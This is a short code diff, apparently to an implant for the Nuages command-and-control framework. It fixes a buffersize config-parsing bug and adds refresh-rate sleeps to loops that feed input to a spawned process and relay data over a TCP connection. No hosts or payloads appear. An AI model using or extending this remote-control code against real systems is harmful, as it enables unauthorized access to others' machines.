@@ -231,11 +231,8 @@ namespace NuagesSharpImplant
                             this.connector.setRefreshRate(int.Parse(x.Value));
                         }
                         else if (x.Key == "buffersize") {
-                        
-                            if (x.Key == "refreshrate")
-                            {
-                                this.connector.setBufferSize(int.Parse(x.Value));
-                            }
+
+                            this.connector.setBufferSize(int.Parse(x.Value));
                         }
                     }
                     List<KeyValuePair<string, JsonValue>> configList = new List<KeyValuePair<string, JsonValue>>();
@@ -415,6 +412,7 @@ namespace NuagesSharpImplant
                         if (inbuff.Length > 0) {
                             pProcess.StandardInput.Write(Encoding.ASCII.GetString(inbuff));
                         }
+                        System.Threading.Thread.Sleep(this.connector.getRefreshRate());
                     }
                     SubmitJobResult(jobId, "Process exited!", false);
                 }
@@ -561,6 +559,7 @@ namespace NuagesSharpImplant
                     IAsyncResult outReadop = srvStream.BeginRead(outbuff, 0, outbuff.Length, null, null);
                     int outBytesRead;
                     byte[] inbuff;
+                    int refreshRate = this.connector.getRefreshRate();
                     while (tcpClient.Connected)
                     {
                         outBytesRead = 0;
@@ -587,6 +586,7 @@ namespace NuagesSharpImplant
                         {
                             srvStream.Write(inbuff, 0, inbuff.Length);
                         }
+                        System.Threading.Thread.Sleep(refreshRate);
                     }
                     SubmitJobResult(jobId, "Tcp Connection Closed", false);
                 }
